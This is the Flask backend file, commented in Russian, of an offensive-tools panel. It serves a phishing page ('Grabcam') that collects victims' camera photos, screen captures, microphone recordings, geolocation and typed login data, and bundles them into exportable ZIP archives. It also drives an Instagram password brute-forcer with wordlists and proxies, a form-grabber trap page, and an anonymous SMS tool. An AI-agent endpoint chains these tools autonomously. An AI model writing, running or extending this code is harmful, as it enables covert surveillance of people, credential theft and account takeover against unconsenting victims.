"""
Точка входа backend: API для панели. Не содержит логики инструментов — только маршруты и вызовы.
"""
import io
import json
import os
import sys
import zipfile
from urllib.parse import quote

# Запуск из корня проекта: python backend/app.py
_BACKEND_DIR = os.path.dirname(os.path.abspath(__file__))
_PROJECT_ROOT = os.path.dirname(_BACKEND_DIR)
_GRABCAM_PANEL_DIR = os.path.join(_PROJECT_ROOT, "tools", "grabcam", "panel")
if _BACKEND_DIR not in sys.path:
    sys.path.insert(0, _BACKEND_DIR)

from flask import Flask, request, jsonify, send_from_directory, send_file, Response
from flask_cors import CORS

from datetime import datetime, timezone, timedelta

from db import init_db, save_run, get_run_history, get_last_successful_run
from tools import get_all_tools, get_tool, run_tool
from tools.tool_formgrab import add_capture, get_captures, get_grab_page_html, get_or_create_token
from settings_keys import get_keys_for_api, save_keys_from_api, load_env_into_os

app = Flask(__name__, static_folder="../static", static_url_path="")
CORS(app)

# Инициализация БД и загрузка ключей из .env при старте
init_db()
load_env_into_os()


@app.route("/")
def index():
    return send_from_directory(app.static_folder, "index.html")


# Страница-ловушка для захвата ввода в формах (Form Grabber)
@app.route("/grab/<token>")
def grab_page(token):
    html = get_grab_page_html(token)
    return Response(html, mimetype="text/html; charset=utf-8")


@app.route("/grabcam/panel/<path:path>")
def grabcam_panel_static(path):
    """Раздача статики панели Grabcam из tools/grabcam/panel/ (модуль в своей директории)."""
    return send_from_directory(_GRABCAM_PANEL_DIR, path)


@app.route("/<path:path>")
def static_files(path):
    return send_from_directory(app.static_folder, path)


# --- API ---

@app.route("/api/tools", methods=["GET"])
def api_tools_list():
    """Список доступных инструментов."""
    return jsonify(get_all_tools())


@app.route("/api/tools/<tool_id>/run", methods=["POST"])
def api_tool_run(tool_id):
    """Запуск инструмента. Body: JSON с параметрами. При неизвестном tool_id — 404 с error."""
    data = request.get_json(silent=True) or {}
    result = run_tool(tool_id, data)
    if not result.get("started"):
        save_run(tool_id, data, result if result.get("success") else None, result.get("error"))
    if tool_id == "grabcam" and result.get("local_url"):
        host = (request.host or "127.0.0.1:5000").split(":")[0]
        result["local_url"] = "http://{}:3333".format(host)
    if not result.get("success") and result.get("error") == f"Unknown tool: {tool_id}":
        return jsonify({"error": result["error"]}), 404
    return jsonify(result)


@app.route("/api/history", methods=["GET"])
def api_history():
    """История запусков. Query: ?tool_id=anonsms (опционально), ?limit=50."""
    tool_id = request.args.get("tool_id")
    limit = min(int(request.args.get("limit", 50) or 50), 200)
    return jsonify(get_run_history(tool_id=tool_id, limit=limit))


@app.route("/api/tools/anonsms/status", methods=["GET"])
def api_anonsms_status():
    """Можно ли отправить бесплатное SMS (24 ч после последней успешной отправки)."""
    last = get_last_successful_run("anonsms")
    if not last:
        return jsonify({"canSend": True, "nextSmsAt": None})
    # SQLite: created_at как 'YYYY-MM-DD HH:MM:SS'
    try:
        created = datetime.strptime(last["created_at"], "%Y-%m-%d %H:%M:%S").replace(tzinfo=timezone.utc)
    except (ValueError, TypeError):
        created = datetime.now(timezone.utc)
    next_at = created + timedelta(hours=24)
    now = datetime.now(timezone.utc)
    if now >= next_at:
        return jsonify({"canSend": True, "nextSmsAt": None})
    return jsonify({"canSend": False, "nextSmsAt": next_at.isoformat()})


@app.route("/api/tools/instagram-bruter/run-status", methods=["GET"])
def api_instagram_bruter_run_status():
    """Живой вывод и статус текущего перебора (для опроса с фронта)."""
    tool = get_tool("instagram-bruter")
    if not tool or not hasattr(tool, "get_run_status"):
        return jsonify({"output": "", "done": True, "result": None, "error": "Инструмент не найден"})
    return jsonify(tool.get_run_status())


@app.route("/api/tools/instagram-bruter/stop", methods=["POST"])
def api_instagram_bruter_stop():
    """Остановить текущий перебор."""
    tool = get_tool("instagram-bruter")
    if not tool or not hasattr(tool, "stop_run"):
        return jsonify({"success": False, "error": "Инструмент не найден"})
    ok, msg = tool.stop_run()
    return jsonify({"success": ok, "message": msg})


@app.route("/api/tools/grabcam/run-status", methods=["GET"])
def api_grabcam_run_status():
    """Статус Grabcam: ссылка Serveo или локальный URL. local_url подставляется по Host запроса для доступа из локальной сети."""
    tool = get_tool("grabcam")
    if not tool or not hasattr(tool, "get_run_status"):
        return jsonify({"running": False, "link": None, "local_url": None, "error": "Инструмент не найден"})
    data = tool.get_run_status()
    if data.get("local_url"):
        host = (request.host or "127.0.0.1:5000").split(":")[0]
        data["local_url"] = "http://{}:3333".format(host)
    return jsonify(data)


@app.route("/api/tools/grabcam/session-stats", methods=["GET"])
def api_grabcam_session_stats():
    """Реальные данные сводки сессии: уникальные IP (устройства) и количество целей по данным из Photo и form_captures."""
    unique_ips = set()
    if os.path.isdir(_GRABCAM_PHOTO_DIR):
        for name in os.listdir(_GRABCAM_PHOTO_DIR):
            sub = os.path.join(_GRABCAM_PHOTO_DIR, name)
            if os.path.isdir(sub) and ".." not in name and name.strip():
                unique_ips.add(name.strip())
    if os.path.isfile(_GRABCAM_FORM_CAPTURES_FILE):
        try:
            with open(_GRABCAM_FORM_CAPTURES_FILE, "r", encoding="utf-8", errors="replace") as f:
                data = json.load(f)
            for c in (data.get("captures") or []):
                ip = (c.get("ip") or "").strip()
                if ip:
                    unique_ips.add(ip)
        except (OSError, ValueError):
            pass
    count = len(unique_ips)
    return jsonify({"unique_ips": count, "targets": count})


@app.route("/api/tools/grabcam/stop", methods=["POST"])
def api_grabcam_stop():
    """Остановить Grabcam (PHP/Serveo)."""
    tool = get_tool("grabcam")
    if not tool or not hasattr(tool, "stop_run"):
        return jsonify({"success": False, "error": "Инструмент не найден"})
    ok, msg = tool.stop_run()
    return jsonify({"success": ok, "message": msg})


# Корень проекта уже задан вверху
_GRABCAM_PHOTO_DIR = os.path.join(_PROJECT_ROOT, "tools", "grabcam", "Photo")


@app.route("/api/tools/grabcam/photos", methods=["GET"])
def api_grabcam_photos():
    """Список последних снятых фото: задняя (back) и передняя (front) камера, галерея. Экран — отдельный endpoint."""
    if not os.path.isdir(_GRABCAM_PHOTO_DIR):
        return jsonify({"photos": [], "total": 0, "unique_devices": 0})
    limit = min(int(request.args.get("limit", 30) or 30), 100)
    allowed_cameras = ("back", "front", "gallery")
    photos = []
    for root, _, files in os.walk(_GRABCAM_PHOTO_DIR):
        for f in files:
            if f.lower().endswith((".png", ".jpg", ".jpeg")):
                full = os.path.join(root, f)
                try:
                    mtime = os.path.getmtime(full)
                except OSError:
                    mtime = 0
                rel = os.path.relpath(full, _GRABCAM_PHOTO_DIR)
                if ".." in rel or rel.startswith("/"):
                    continue
                rel_norm = rel.replace("\\", "/")
                parts = rel_norm.split("/")
                ip = parts[0] if len(parts) >= 1 else ""
                camera = parts[1] if len(parts) >= 2 else ""
                if camera not in allowed_cameras:
                    continue
                photos.append({"path": rel_norm, "mtime": mtime, "ip": ip, "camera": camera})
    photos.sort(key=lambda x: -x["mtime"])
    total_all = len(photos)
    unique_ips = len(set(p["ip"] for p in photos))
    photos = photos[:limit]
    for p in photos:
        p["url"] = "/api/tools/grabcam/photo?path=" + quote(p["path"], safe="")
    return jsonify({
        "photos": photos,
        "total": total_all,
        "unique_devices": unique_ips,
    })


@app.route("/api/tools/grabcam/photo", methods=["GET"])
def api_grabcam_photo():
    """Отдать одно фото из папки Photo. Query: path=IP/front/file.png"""
    photo_path = (request.args.get("path") or "").strip()
    if not photo_path or ".." in photo_path or photo_path.startswith("/") or "\\" in photo_path:
        return "", 404
    photo_path = photo_path.replace("\\", "/")
    return send_from_directory(_GRABCAM_PHOTO_DIR, photo_path)


def _collect_media_by_type(media_type, allowed_extensions):
    """Собирает файлы из Photo/IP/media_type/ (screen или audio)."""
    if not os.path.isdir(_GRABCAM_PHOTO_DIR):
        return []
    items = []
    for name in os.listdir(_GRABCAM_PHOTO_DIR):
        sub = os.path.join(_GRABCAM_PHOTO_DIR, name)
        type_dir = os.path.join(sub, media_type)
        if not os.path.isdir(type_dir) or ".." in name:
            continue
        for f in os.listdir(type_dir):
            if not any(f.lower().endswith(ext) for ext in allowed_extensions):
                continue
            full = os.path.join(type_dir, f)
            try:
                mtime = os.path.getmtime(full)
            except OSError:
                mtime = 0
            rel = os.path.relpath(full, _GRABCAM_PHOTO_DIR).replace("\\", "/")
            items.append({"path": rel, "mtime": mtime, "ip": name})
    return items


@app.route("/api/tools/grabcam/screen", methods=["GET"])
def api_grabcam_screen():
    """Список захватов экрана (Photo/IP/screen/)."""
    limit = min(int(request.args.get("limit", 30) or 30), 100)
    items = _collect_media_by_type("screen", (".png", ".jpg", ".jpeg"))
    items.sort(key=lambda x: -x["mtime"])
    items = items[:limit]
    for p in items:
        p["url"] = "/api/tools/grabcam/photo?path=" + quote(p["path"], safe="")
    return jsonify({"items": items, "total": len(items)})


@app.route("/api/tools/grabcam/audio", methods=["GET"])
def api_grabcam_audio():
    """Список записей микрофона (Photo/IP/audio/)."""
    limit = min(int(request.args.get("limit", 50) or 50), 150)
    items = _collect_media_by_type("audio", (".webm", ".mp4", ".ogg", ".wav"))
    items.sort(key=lambda x: -x["mtime"])
    items = items[:limit]
    for p in items:
        p["url"] = "/api/tools/grabcam/file?path=" + quote(p["path"], safe="")
    return jsonify({"items": items, "total": len(items)})


@app.route("/api/tools/grabcam/file", methods=["GET"])
def api_grabcam_file():
    """Отдать файл из Photo (аудио и т.д.)."""
    path = (request.args.get("path") or "").strip()
    if not path or ".." in path or path.startswith("/") or "\\" in path:
        return "", 404
    path = path.replace("\\", "/")
    return send_from_directory(_GRABCAM_PHOTO_DIR, path)


def _parse_geo_info(content):
    """Парсит geo_info.txt в словарь."""
    d = {"ip": "", "country": "", "region": "", "city": "", "lat": "", "lon": "", "isp": "", "last_update": ""}
    for line in content.splitlines():
        line = line.strip()
        if ":" not in line:
            continue
        key, _, val = line.partition(":")
        key, val = key.strip().lower(), val.strip()
        if key == "ip":
            d["ip"] = val
        elif key == "country":
            d["country"] = val
        elif key == "region":
            d["region"] = val
        elif key == "city":
            d["city"] = val
        elif key == "latitude":
            d["lat"] = val
        elif key == "longitude":
            d["lon"] = val
        elif key == "isp":
            d["isp"] = val
        elif key == "last update":
            d["last_update"] = val
    return d


@app.route("/api/tools/grabcam/locations", methods=["GET"])
def api_grabcam_locations():
    """Список IP и местоположений из Photo/*/geo_info.txt."""
    if not os.path.isdir(_GRABCAM_PHOTO_DIR):
        return jsonify({"locations": []})
    locations = []
    for name in os.listdir(_GRABCAM_PHOTO_DIR):
        sub = os.path.join(_GRABCAM_PHOTO_DIR, name)
        if not os.path.isdir(sub) or ".." in name:
            continue
        geo_file = os.path.join(sub, "geo_info.txt")
        if not os.path.isfile(geo_file):
            continue
        try:
            with open(geo_file, "r", encoding="utf-8", errors="replace") as f:
                content = f.read()
        except OSError:
            continue
        geo = _parse_geo_info(content)
        geo["device_id"] = name
        try:
            mtime = os.path.getmtime(geo_file)
            geo["mtime"] = mtime
        except OSError:
            geo["mtime"] = 0
        locations.append(geo)
    locations.sort(key=lambda x: -x["mtime"])
    return jsonify({"locations": locations})


_GRABCAM_FORM_CAPTURES_FILE = os.path.join(_PROJECT_ROOT, "tools", "grabcam", "form_captures.json")
_GRABCAM_OPTIONS_FILE = os.path.join(_PROJECT_ROOT, "tools", "grabcam", "options.json")


@app.route("/api/tools/grabcam/options", methods=["GET"])
def api_grabcam_options_get():
    """Текущие опции (камера, гео, форма, галерея, микрофон, экран). Меняются на лету без перезапуска."""
    default = {"camera": True, "geo": True, "form": True, "gallery": False, "mic": False, "screen": False}
    if not os.path.isfile(_GRABCAM_OPTIONS_FILE):
        return jsonify(default)
    try:
        with open(_GRABCAM_OPTIONS_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        for k in default:
            if k in data and isinstance(data[k], bool):
                default[k] = data[k]
    except (OSError, ValueError):
        pass
    return jsonify(default)


@app.route("/api/tools/grabcam/options", methods=["POST"])
def api_grabcam_options_post():
    """Сохранить опции. Страница фишинга подхватывает их без перезапуска."""
    data = request.get_json(silent=True) or {}
    options = {
        "camera": bool(data.get("camera", True)),
        "geo": bool(data.get("geo", True)),
        "form": bool(data.get("form", True)),
        "gallery": bool(data.get("gallery", False)),
        "mic": bool(data.get("mic", False)),
        "screen": bool(data.get("screen", False)),
    }
    try:
        with open(_GRABCAM_OPTIONS_FILE, "w", encoding="utf-8") as f:
            json.dump(options, f, ensure_ascii=False, indent=2)
    except OSError:
        return jsonify({"success": False, "error": "Не удалось записать файл"}), 500
    return jsonify({"success": True, "options": options})


@app.route("/api/tools/grabcam/form-captures", methods=["GET"])
def api_grabcam_form_captures():
    """Введённые данные с формы входа на странице фишинга (одна ссылка Grabcam)."""
    limit = min(int(request.args.get("limit", 100) or 100), 500)
    captures = []
    if os.path.isfile(_GRABCAM_FORM_CAPTURES_FILE):
        try:
            with open(_GRABCAM_FORM_CAPTURES_FILE, "r", encoding="utf-8", errors="replace") as f:
                data = json.load(f)
            captures = (data.get("captures") or [])[-limit:]
            captures = list(reversed(captures))
        except (OSError, ValueError):
            pass
    return jsonify({"captures": captures})


def _build_grabcam_export_zip():
    """Собирает ZIP: Photo/, form_captures.json, report.txt."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        if os.path.isfile(_GRABCAM_FORM_CAPTURES_FILE):
            with open(_GRABCAM_FORM_CAPTURES_FILE, "r", encoding="utf-8", errors="replace") as f:
                zf.writestr("form_captures.json", f.read())
        report_lines = ["Grabcam Export Report", "=====================", ""]
        if os.path.isdir(_GRABCAM_PHOTO_DIR):
            for root, _, files in os.walk(_GRABCAM_PHOTO_DIR):
                for f in files:
                    full = os.path.join(root, f)
                    rel = os.path.relpath(full, _GRABCAM_PHOTO_DIR)
                    arcname = "Photo/" + rel.replace("\\", "/")
                    try:
                        zf.write(full, arcname)
                    except OSError:
                        pass
            for name in os.listdir(_GRABCAM_PHOTO_DIR):
                sub = os.path.join(_GRABCAM_PHOTO_DIR, name)
                if os.path.isdir(sub) and ".." not in name:
                    report_lines.append(f"Device: {name.replace('_', '.')}")
                    report_lines.append(f"  Folder: Photo/{name}/")
                    report_lines.append("")
        zf.writestr("report.txt", "\n".join(report_lines))
    buf.seek(0)
    return buf.getvalue()


@app.route("/api/tools/grabcam/export", methods=["GET"])
def api_grabcam_export():
    """Скачать все данные Grabcam одним ZIP-архивом."""
    try:
        data = _build_grabcam_export_zip()
    except Exception as e:
        return jsonify({"error": str(e)}), 500
    return send_file(
        io.BytesIO(data),
        mimetype="application/zip",
        as_attachment=True,
        download_name="grabcam_export.zip",
    )


@app.route("/api/tools/instagram-bruter/tried-count", methods=["GET"])
def api_instagram_bruter_tried_count():
    """Количество уже проверенных паролей для аккаунта (?username=xxx)."""
    from db import get_instagram_tried_count
    username = (request.args.get("username") or "").strip()
    return jsonify({"count": get_instagram_tried_count(username)})


@app.route("/api/tools/instagram-bruter/clear-tried", methods=["POST"])
def api_instagram_bruter_clear_tried():
    """Сбросить учёт проверенных паролей для аккаунта (чтобы можно было повторить те же пароли)."""
    from db import clear_instagram_tried_passwords
    data = request.get_json(silent=True) or {}
    username = (data.get("username") or "").strip()
    if not username:
        return jsonify({"success": False, "error": "Укажите имя аккаунта."})
    clear_instagram_tried_passwords(username)
    return jsonify({"success": True, "message": "Проверенные пароли для этого аккаунта сброшены."})


@app.route("/api/tools/instagram-bruter/found-list", methods=["GET"])
def api_instagram_bruter_found_list():
    """Список найденных учёток (логин/пароль) для отображения в панели."""
    from db import get_instagram_found_list
    limit = min(int(request.args.get("limit", 50) or 50), 200)
    return jsonify({"found": get_instagram_found_list(limit=limit)})


@app.route("/api/tools/instagram-bruter/refresh-lists", methods=["POST"])
def api_instagram_bruter_refresh_lists():
    """Скачать и сохранить списки паролей и прокси для офлайн-работы."""
    tool = get_tool("instagram-bruter")
    if not tool:
        return jsonify({"success": False, "error": "Инструмент не найден"})
    ok_w, msg_w = tool.download_wordlist()
    ok_p, msg_p = tool.refresh_proxy_list()
    return jsonify({
        "success": ok_w and ok_p,
        "wordlist": {"ok": ok_w, "message": msg_w},
        "proxies": {"ok": ok_p, "message": msg_p},
    })


# --- Form Grabber ---
@app.route("/api/tools/formgrab/url", methods=["GET"])
def api_formgrab_url():
    """Создать новую ссылку для захвата форм. Возвращает token и url."""
    token = get_or_create_token()
    url = request.host_url.rstrip("/") + "/grab/" + token
    return jsonify({"token": token, "url": url})


@app.route("/api/tools/formgrab/capture", methods=["POST"])
def api_formgrab_capture():
    """Принять введённые данные с страницы-ловушки."""
    data = request.get_json(silent=True) or {}
    token = (data.get("token") or "").strip()
    field = (data.get("field") or "").strip()
    value = (data.get("value") or "").strip()
    ip = request.remote_addr or ""
    if not token:
        return jsonify({"success": False, "error": "token required"}), 400
    add_capture(token, field, value, ip)
    return jsonify({"success": True})


@app.route("/api/tools/formgrab/captures", methods=["GET"])
def api_formgrab_captures():
    """Список захваченных вводов для токена."""
    token = (request.args.get("token") or "").strip()
    limit = min(int(request.args.get("limit", 100) or 100), 500)
    if not token:
        return jsonify({"captures": []})
    return jsonify({"captures": get_captures(token, limit=limit)})


# --- AI Agent (помощник OSINT/Pentest) ---
@app.route("/api/ai/status", methods=["GET"])
def api_ai_status():
    """Доступен ли ИИ-помощник (настроен ли ключ или Ollama)."""
    try:
        from ai_agent import is_ai_available
        return jsonify({"available": is_ai_available()})
    except ImportError:
        return jsonify({"available": False})


@app.route("/api/ai/chat", methods=["POST"])
def api_ai_chat():
    """Чат с ИИ-агентом. ИИ может сам запускать инструменты (ACTION/PARAMS). Body: { "message", "context", "history" }."""
    try:
        from ai_agent import chat_with_tools
    except ImportError:
        return jsonify({"success": False, "error": "Модуль ИИ не найден"}), 500
    data = request.get_json(silent=True) or {}
    message = (data.get("message") or "").strip()
    if not message:
        return jsonify({"success": False, "error": "Укажите message."}), 400
    result = chat_with_tools(
        user_message=message,
        context=(data.get("context") or "")[:5000],
        history=data.get("history") or [],
        run_tool_fn=run_tool,
        max_tool_steps=15,
    )
    return jsonify(result)


@app.route("/api/ai/suggest", methods=["POST"])
def api_ai_suggest():
    """Подсказки «что делать дальше» по контексту. Body: { "context": "..." }."""
    try:
        from ai_agent import suggest_next_steps
    except ImportError:
        return jsonify({"success": False, "error": "Модуль ИИ не найден"}), 500
    data = request.get_json(silent=True) or {}
    context = (data.get("context") or "").strip()
    return jsonify(suggest_next_steps(context))


@app.route("/api/ai/automate", methods=["POST"])
def api_ai_automate():
    """
    Автономное выполнение: ИИ по цели сам запускает инструменты по очереди.
    Body: { "goal": "разведай домен example.com", "max_steps": 10 }.
    """
    try:
        from ai_agent import get_next_action, is_ai_available
    except ImportError:
        return jsonify({"success": False, "error": "Модуль ИИ не найден"}), 500
    if not is_ai_available():
        return jsonify({"success": False, "error": "ИИ не настроен. Укажите OLLAMA_URL или AI_OPENAI_API_KEY."}), 400
    data = request.get_json(silent=True) or {}
    goal = (data.get("goal") or "").strip()
    if not goal:
        return jsonify({"success": False, "error": "Укажите goal (цель)."}), 400
    max_steps = max(1, min(15, int(data.get("max_steps") or 10)))
    state = {"goal": goal, "steps": []}
    for _ in range(max_steps):
        action = get_next_action(goal, state)
        if action.get("done"):
            return jsonify({
                "success": True,
                "steps": state["steps"],
                "summary": action.get("summary", ""),
                "finished": True,
            })
        tool_id = (action.get("tool_id") or "").strip()
        params = action.get("params") or {}
        if not tool_id:
            return jsonify({
                "success": True,
                "steps": state["steps"],
                "summary": "Агент не указал инструмент.",
                "finished": True,
            })
        result = run_tool(tool_id, params)
        output_full = (result.get("output") or result.get("error") or "")
        output_preview = (output_full[:2000] + "…") if len(output_full) > 2000 else output_full
        state["steps"].append({
            "tool_id": tool_id,
            "params": params,
            "success": bool(result.get("success")),
            "error": result.get("error"),
            "output_preview": output_preview,
        })
    return jsonify({
        "success": True,
        "steps": state["steps"],
        "summary": f"Достигнут лимит шагов ({max_steps}). Итог по последним результатам — см. шаги.",
        "finished": True,
    })


@app.route("/api/settings/keys", methods=["GET"])
def api_settings_keys_get():
    """Список ключей с подсказками и замаскированными значениями."""
    return jsonify(get_keys_for_api())


@app.route("/api/settings/keys", methods=["POST"])
def api_settings_keys_post():
    """Сохранить ключи в .env. Body: { "TEXTBELT_API_KEY": "xxx", ... }."""
    data = request.get_json(silent=True) or {}
    save_keys_from_api(data)
    load_env_into_os()
    return jsonify({"success": True})


if __name__ == "__main__":
    os.makedirs(os.path.join(os.path.dirname(__file__), "..", "static"), exist_ok=True)
    app.run(host="0.0.0.0", port=5000, debug=True)
